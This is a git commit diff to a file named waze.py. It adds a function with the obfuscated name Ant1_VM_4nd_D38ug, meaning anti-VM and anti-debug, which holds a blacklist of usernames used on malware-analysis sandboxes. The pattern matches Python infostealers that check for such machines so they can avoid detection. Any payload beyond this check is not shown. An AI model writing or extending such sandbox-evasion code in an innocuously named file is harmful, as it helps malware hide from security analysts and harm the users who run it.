539b5467fbe015b9e191a85c3869983149fe40b7
coucou1337 <onastarrs@gmail.com>
2024-10-02 19:03:53 +0200

    Update waze.py

--- waze.py
+++ waze.py
@@ -1,18 +1,10 @@
-import os
-import socket
-import requests
-import subprocess
-import uuid
-
-def install(package):
-    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-
-required_packages = ['os', 'socket', 'requests', 'subprocess', 'uuid']
-
-try:
+def Ant1_VM_4nd_D38ug():
+    import os
+    import socket
     import requests
-except ImportError:
-    install('requests')
+    import subprocess
+    import uuid
+    import sys
 
     b14ck_1i5t_u53rn4m35 = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'Bruno' 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
                             'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', 'stephpie']
